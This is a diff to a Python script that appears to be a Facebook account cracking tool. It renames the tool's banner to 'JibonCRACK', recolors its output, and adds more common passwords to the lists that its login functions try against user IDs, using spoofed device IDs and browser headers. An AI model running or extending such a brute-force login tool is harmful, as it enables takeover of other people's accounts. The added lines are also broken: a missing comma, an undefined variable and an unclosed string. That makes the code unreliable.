@@ -85,16 +85,16 @@ user = []
 # --- ANSI Color Codes ---
 X = '\x1b[1;37m'
 rad = '\x1b[38;5;196m'
-G = '\x1b[38;5;46m'
-Y = '\x1b[38;5;220m'
-PP = '\x1b[38;5;203m'
+G = '\x1b[38;5;39m'
+Y = '\x1b[38;5;33m'
+PP = '\x1b[38;5;197m'
 RR = '\x1b[38;5;196m'
-GS = '\x1b[38;5;40m'
+GS = '\x1b[38;5;27m'
 W = '\x1b[1;37m'
 red = '\x1b[38;5;196m'
-green = '\x1b[38;5;46m'
+green = '\x1b[38;5;39m'
 white = '\x1b[1;37m'
-yellow = '\x1b[38;5;226m'
+yellow = '\x1b[38;5;33m'
 
 # --- User-Agent Generators ---
 # These functions generate randomized User-Agent strings to mimic browsers.
@@ -340,10 +340,10 @@ def login_1(uid):
     global loop
     try:
         session = requests.session()
-        sys.stdout.write(f'\r\r{red}|{green}LammimCRACK{red}|{green} {loop} {white}| {green}OK {white}| {red}{len(oks)}{white}')
+        sys.stdout.write(f'\r\r{red}|{green}JibonCRACK{red}|{read} {loop} {white}| {green}OK {white}| {red}{len(oks)}{white}')
         sys.stdout.flush()
         
-        for pw in ('123456', '1234567', '12345678', '123456789'):
+        for pw in ('123456', '1234567', '12345678', '123456789' '111111', '12345678910'):
             data = {
                 'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()),
                 'cpl': 'true', 'family_device_id': str(uuid.uuid4()),
@@ -386,9 +386,9 @@ def login_1(uid):
 def login_2(uid):
     global loop
     try:
-        sys.stdout.write(f'\r\r{red}|{green}LSCRACK{red}|{green} {loop} {white}| {green}OK {white}| {red}{len(oks)}{white}')
+        sys.stdout.write(f'\r\r{red}|{green}JIBONCRACK{red}|{green} {loop} {white}| {green}OK {white}| {red}{len(oks)}{white}')
         
-        for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
+        for pw in ('123456', '123123', '1234567', '12345678', '123456789', '111111', '12345678910):
             with requests.Session() as session:
                 headers = {
                     'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
